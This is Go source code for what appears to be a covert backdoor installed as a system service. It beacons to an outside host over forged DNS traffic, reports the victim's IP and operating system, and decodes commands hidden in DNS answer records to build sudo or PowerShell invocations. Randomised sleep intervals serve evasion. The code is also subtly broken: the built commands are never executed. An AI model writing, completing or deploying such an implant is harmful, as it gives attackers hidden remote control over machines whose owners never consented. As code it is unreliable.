package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"math/big"
	"net"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/kardianos/service"
)

type commandJSON struct {
	Verb    string
	Scope   string
	Command string
}

func determineMatchOnCommandScope(scope string, hostIPaddr string) bool {
	if runtime.GOOS == "linux" && strings.ToLower(scope) == "linux" {
		return true
	} else if runtime.GOOS == "windows" && strings.ToLower(scope) == "windows" {
		return true
	} else if strings.ContainsAny(scope, "x") {
		for i := 0; i < 4; i++ {
			if !((strings.Split(scope, ".")[i] == strings.Split(hostIPaddr, ".")[i]) || strings.Split(scope, ".")[i] == "x") {
				return false
			}
		}
		return true
	} else {
		if hostIPaddr == scope {
			return true
		}
		return false
	}
}

type program struct{}

func (p *program) Start(s service.Service) error {
	go p.run()
	return nil
}

func (p *program) run() {
	toContinue := true
	timeToSleep := 1
	for {
		toContinue = true
		serverConn, err := net.Dial("udp", "dns1.javalanche.net:53")
		if err != nil {
			panic(err)
		}
		defer serverConn.Close()

		hostIPAddr := strings.Split(serverConn.LocalAddr().String(), ":")[0]
		octetOne, _ := strconv.Atoi(strings.Split(hostIPAddr, ".")[0])
		octetTwo, _ := strconv.Atoi(strings.Split(hostIPAddr, ".")[1])
		octetThree, _ := strconv.Atoi(strings.Split(hostIPAddr, ".")[2])
		octetFour, _ := strconv.Atoi(strings.Split(hostIPAddr, ".")[3])

		osbyte := 0
		if runtime.GOOS == "linux" {
			osbyte = 1
		}

		dnsmessage := []byte{
			byte(osbyte), byte(timeToSleep), // Transaction ID
			0x01, 0x00, // Flags: standard query
			0x00, 0x01, // Questions: 1
			0x00, 0x01, // Answer RRs: 1
			0x00, 0x00, // Authority RRs: 0
			0x00, 0x00, // Additional RRs: 0
			0x06, 'g', 'o', 'o', 'g', 'l', 'e',
			0x03, 'c', 'o', 'm',
			0x00,       // End of domain name
			0x00, 0x01, // Type: A
			0x00, 0x01, // Class: IN
			0xC0, 0x0C, // pointer to query name (there isn't one)
			0x00, 0x01, // Type: A
			0x00, 0x01, // Class: In
			0x00, 0x00, 0x00, 0x3c, // TTL: 60
			0x00, 0x04, // Data Length: 4 bytes
			byte(octetOne), byte(octetTwo), byte(octetThree), byte(octetFour), // Host IP Address
		}

		_, err = serverConn.Write(dnsmessage)
		if err != nil {
			panic(err)
		}

		serverReply := make([]byte, 4096)
		n, err := serverConn.Read(serverReply)
		if err != nil {
			panic(err)
		}
		serverReply = serverReply[:n]

		// Skip header (12 bytes) and question section
		offset := 12
		for {
			if serverReply[offset] == 0 {
				offset++
				break
			}
			offset += int(serverReply[offset]) + 1
		}
		offset += 4 // Skip QTYPE and QCLASS

		// Parse answers
		var encodedBytes []byte
		answerCount := int(binary.BigEndian.Uint16(serverReply[6:8]))
		for i := 0; i < answerCount; i++ {
			if offset+10 > len(serverReply) {
				break
			}
			offset += 2 // Name (compressed pointer)
			typ := binary.BigEndian.Uint16(serverReply[offset : offset+2])
			offset += 2
			offset += 2 // Class
			offset += 4 // TTL
			rdlength := int(binary.BigEndian.Uint16(serverReply[offset : offset+2]))
			offset += 2
			if typ == 1 && rdlength == 4 { // A record
				if offset+4 > len(serverReply) {
					break
				}
				if !(serverReply[offset] == byte(octetOne) && serverReply[offset+1] == byte(octetTwo) && serverReply[offset+2] == byte(octetThree) && serverReply[offset+3] == byte(octetFour)) {
					if !(serverReply[offset] == byte(8) && serverReply[offset+1] == byte(8) && serverReply[offset+2] == byte(8) && serverReply[offset+3] == byte(8)) {
						encodedBytes = append(encodedBytes, serverReply[offset], serverReply[offset+1], serverReply[offset+2], serverReply[offset+3])
					} else {
						toContinue = false
					}
				}
			}
			offset += rdlength
		}
		if toContinue {
			decodedBytes, _ := base64.StdEncoding.DecodeString(string(encodedBytes))

			var commandJSONsentByServer commandJSON

			json.Unmarshal(decodedBytes, &commandJSONsentByServer)

			if determineMatchOnCommandScope(commandJSONsentByServer.Scope, hostIPAddr) {
				if runtime.GOOS == "linux" {
					exec.Command("/bin/sh", "-c", "sudo "+commandJSONsentByServer.Command)
				} else {
					exec.Command("Powershell.exe", "-Command", commandJSONsentByServer.Command)
				}
			}
		}

		randomTime, _ := rand.Int(rand.Reader, big.NewInt(int64(120)))
		randomTimeInt := randomTime.Int64() + 120
		print(randomTimeInt)
		time.Sleep(time.Duration(randomTimeInt) * time.Second)
		timeToSleep = int(randomTimeInt)

	}
}

func (p *program) Stop(s service.Service) error {
	return nil
}

func main() {
	svcConfig := &service.Config{
		Name:        "MyService",
		DisplayName: "MyDisplayNameService",
		Description: "Da Service",
	}

	prg := &program{}
	s, _ := service.New(prg, svcConfig)
	s.Run()
}
